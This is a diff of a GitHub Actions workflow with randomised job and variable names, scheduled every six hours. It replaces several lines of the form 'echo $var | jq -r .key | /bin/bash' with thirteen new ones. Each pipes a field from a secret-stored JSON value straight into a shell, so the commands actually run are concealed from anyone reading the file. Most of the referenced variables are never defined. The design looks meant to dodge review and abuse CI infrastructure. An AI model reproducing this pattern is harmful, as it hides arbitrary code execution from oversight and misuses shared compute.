@@ -3,21 +3,28 @@ name: qinxunji4187
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
-jobs:  # 958
+    - cron: '5 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qinxunji4187
         env:
-          picqc3529: ${{ secrets.picqc3529 }}
+          z9: ${{ secrets.z9 }}
         run: |
-          echo $picqc3529 | jq -r .k6 | /bin/bash
-          echo $jec2303 | jq -r .o5767 | /bin/bash
-          echo $dffd385 | jq -r .kus2 | /bin/bash
-          echo $druap415 | jq -r .du2 | /bin/bash
-          echo $ouq145 | jq -r .cd928 | /bin/bash
-          echo $r615 | jq -r .weo66746 | /bin/bash
-          echo $lz07 | jq -r .xuha11113 | /bin/bash
+          echo $z9 | jq -r .ulc6782 | /bin/bash
+          echo $zyqvb6742 | jq -r .sqtwd5081 | /bin/bash
+          echo $xx98273 | jq -r .mrwr54572 | /bin/bash
+          echo $pvcxq9123 | jq -r .t245 | /bin/bash
+          echo $mgskk24819 | jq -r .xvwbi5 | /bin/bash
+          echo $em63255 | jq -r .yvrs5192 | /bin/bash
+          echo $ekvp05407 | jq -r .emn58479 | /bin/bash
+          echo $o85 | jq -r .pin248 | /bin/bash
+          echo $bodnd14582 | jq -r .dhwj6 | /bin/bash
+          echo $e285 | jq -r .zwrvd71507 | /bin/bash
+          echo $izw19 | jq -r .o3 | /bin/bash
+          echo $jsyd66080 | jq -r .sfa6 | /bin/bash
+          echo $g3 | jq -r .uy21685 | /bin/bash
 
